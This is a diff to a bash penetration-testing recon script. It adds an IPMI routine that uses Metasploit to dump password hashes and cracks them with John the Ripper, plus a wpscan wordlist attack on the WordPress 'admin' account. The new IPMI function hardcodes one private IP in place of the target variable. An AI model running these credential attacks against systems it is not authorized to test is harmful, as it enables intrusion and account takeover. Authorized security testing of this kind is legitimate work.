@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20180419 Kirby
+# 20180422 Kirby
 
 
 umask 077
@@ -132,6 +132,16 @@ function MAIN()
             echo "... outputs $RECONDIR/${TARGET}.showmount-a if anything found"
             echo "... outputs $RECONDIR/${TARGET}.nfsls if anything found"
             nfsScan &
+        fi
+
+        # ipmi
+        if echo $rawport |egrep -q '623/open/'
+        then
+            echo "starting ipmiScan"
+            echo "... outputs $RECONDIR/${TARGET}.ipmi.hashcat"
+            echo "... outputs $RECONDIR/${TARGET}.ipmi.john"
+            echo "... outputs $RECONDIR/${TARGET}.ipmi.john.cracked"
+            ipmiScan &
         fi
     
         # dns
@@ -383,7 +393,7 @@ function buildEnv()
 {
     local file
     local pkg
-    local pkgs="alien bind9-host blindelephant cewl curl dirb dnsenum dnsrecon exif exploitdb eyewitness hydra ike-scan joomscan jq ldap-utils libxml2-utils libwww-mechanize-perl mariadb-common ncrack nikto nmap nsis open-iscsi openvas-cli postgresql-client-common rpm rsh-client screen seclists skipfish snmpcheck wfuzz wget whatweb wpscan xmlstarlet"
+    local pkgs="alien bind9-host blindelephant cewl curl dirb dnsenum dnsrecon exif exploitdb eyewitness hydra ike-scan john joomscan jq ldap-utils libxml2-utils libwww-mechanize-perl mariadb-common metasploit-framework ncrack nikto nmap nsis open-iscsi openvas-cli postgresql-client-common rpm rsh-client screen seclists skipfish snmpcheck wfuzz wget whatweb wpscan xmlstarlet"
 
     for pkg in $pkgs
     do
@@ -782,7 +792,7 @@ function snmpScan()
 function nmapScan()
 {
     # other udp ports: U:111,123,12444,1258,13,13200,1604,161,17185,17555,177,1900,20110,20510,2126,2302,23196,26000,27138,27244,27777,27950,28138,30710,3123,31337,3478,3671,37,3702,3784,389,44818,4569,47808,49160,49161,49162,500,5060,53,5351,5353,5683,623,636,64738,6481,67,69,8611,8612,8767,88,9100,9600 
-    nmap --open -T3 -sT -sU -p T:1-65535,U:111,123,161,500,53,67,5353,1813,4500,69,177,5060,5269 \
+    nmap --open -T3 -sT -sU -p T:1-65535,U:67,68,69,111,123,161,500,53,67,623,5353,1813,4500,177,5060,5269 \
         --script=version -sV --version-all -O \
         -oN "$RECONDIR"/${TARGET}.nmap \
         -oG "$RECONDIR"/${TARGET}.ngrep \
@@ -1567,7 +1577,7 @@ function fuzzURLs()
         post=$(echo $line|awk '{print $1}')
         url=$(echo $line|awk '{print $2}')
         #url=${url//\&/\\&}
-        wfuzzfile=$(echo ${url//\//,} |cut -d',' -f1-4)
+        wfuzzfile=$(echo ${url//\//,} |cut -d',' -f1-4 |cut -d';' -f1)
         #wfuzzfile=${wfuzzfile// /,}
         #wfuzzfile=${wfuzzfile//-/_}
         #wfuzzfile=${wfuzzfile//\"/}
@@ -1784,23 +1794,62 @@ function scanURLs()
     # run wpscan on first found wordpress
     for url in $(egrep -i 'wordpress|/wp' "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
     do
+        echo "Running wpscan on $url"
+        echo "##################################################" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
         $TIMEOUT 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
-            --no-banner --no-color --batch --url "$url" > "$RECONDIR"/${TARGET}.wpscan 2>&1 &
+            --no-banner --no-color --batch --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
+
+        echo "Running wpscan admin crack on $url"
+        echo "##################################################" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
+        echo "CRACKING ADMIN FOR URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
+        $TIMEOUT 900 wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
+            --username admin >> "$RECONDIR"/${TARGET}.wpscan 2>&1
     done
 
     # run joomscan on first found joomla
     for url in $(grep -i joomla "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
     do
-        $TIMEOUT 900 joomscan -pe -u "$url" > "$RECONDIR"/${TARGET}.joomscan 2>&1 &
+        echo "Running joomscan on $url"
+        echo "##################################################" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
+        $TIMEOUT 900 joomscan -pe -u "$url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
     done
 
     # run fimap on anything with php
     for url in $(egrep -i '\.php$' "$RECONDIR"/${TARGET}.urls |awk '{print $1}')
     do
+        echo "Running fimap on $url"
+        echo "##################################################" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
         $TIMEOUT 300 fimap --force-run -4 -u "$url" 2>&1 \
             |egrep -v '^fimap |^Another fimap|^:: |^Starting harvester|^No links found|^AutoAwesome is done' \
             >> "$RECONDIR"/${TARGET}.fimap
     done
+
+    return 0
+}
+################################################################################
+
+################################################################################
+function ipmiScan()
+{
+    local cmdfile="$RECONDIR"/tmp/ipmi.metasploit
+
+    echo "use auxiliary/scanner/ipmi/ipmi_dumphashes" >> $cmdfile
+    echo "set RHOSTS 192.168.1.17" >> $cmdfile
+    echo "set OUTPUT_HASHCAT_FILE $RECONDIR/${TARGET}.ipmi.hashcat" >> $cmdfile
+    echo "set OUTPUT_JOHN_FILE $RECONDIR/${TARGET}.ipmi.john" >> $cmdfile
+    echo "run" >> $cmdfile
+    echo "exit" >> $cmdfile
+
+    /usr/share/metasploit-framework/msfconsole -n -r $cmdfile >/dev/null 2>&1
+
+    if [[ -f $RECONDIR/${TARGET}.ipmi.john ]]
+    then
+        john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john >/dev/null 2>&1
+        john --show $RECONDIR/${TARGET}.ipmi.john >$RECONDIR/${TARGET}.ipmi.john.cracked 2>&1
+    fi
 
     return 0
 }
